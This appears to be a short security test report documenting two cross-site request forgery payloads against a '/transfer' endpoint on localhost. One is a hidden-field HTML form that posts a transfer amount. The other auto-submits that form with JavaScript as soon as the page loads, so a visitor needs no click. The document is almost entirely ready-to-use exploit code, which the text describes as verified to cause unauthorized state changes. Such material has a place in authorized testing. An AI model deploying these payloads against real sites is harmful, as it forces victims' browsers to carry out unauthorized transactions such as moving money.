# Documented Payloads

The following payloads were successfully verified against the `/transfer` endpoint to execute unauthorized state changes.

### Payload 1: Standard HTML Form with User-Triggered Action
This payload uses a standard `application/x-www-form-urlencoded` post body. The framework automatically parses parameters out of this content type, bypassing any rigid structural assumptions.

```html
<!DOCTYPE html>
<html lang="en">
<body>
  <form action="http://localhost:8080/transfer" method="POST">
    <input type="hidden" name="amount" value="1000">
    <button type="submit">Test transfer</button>
  </form>
</body>
</html>
```

### Payload 2: Automated/Invisible Zero-Click Form Execution
This payload streamlines the process by leveraging JavaScript to instantly fire the form submission the moment the document object model finishes loading, eliminating the need for user interaction beyond visiting the page.

```html
<!DOCTYPE html>
<html lang="en">
<head>
    <title>Exploit</title>
</head>
<body>
    <form id="csrfForm" action="http://localhost:8080/transfer" method="POST">
        <input type="hidden" name="amount" value="1000">
    </form>
    
    <script>
        window.addEventListener('DOMContentLoaded', () => {
            document.getElementById('csrfForm').submit();
        });
    </script>
</body>
</html>

```

